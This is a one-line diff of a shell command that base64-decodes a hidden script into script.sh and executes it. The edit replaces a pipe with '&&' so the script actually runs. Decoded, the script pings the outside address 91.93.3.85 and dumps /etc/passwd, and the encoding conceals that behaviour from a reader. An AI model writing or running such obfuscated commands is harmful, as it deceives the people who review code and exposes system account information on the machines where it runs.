@@ -1,1 +1,1 @@
-echo IyEvYmluL2Jhc2gKCnBpbmcgOTEuOTMuMy44NQoKY2F0IC9ldGMvcGFzc3dk | base64 --decode > script.sh | sh script.sh
+echo IyEvYmluL2Jhc2gKCnBpbmcgOTEuOTMuMy44NQoKY2F0IC9ldGMvcGFzc3dk | base64 --decode > script.sh && sh script.sh
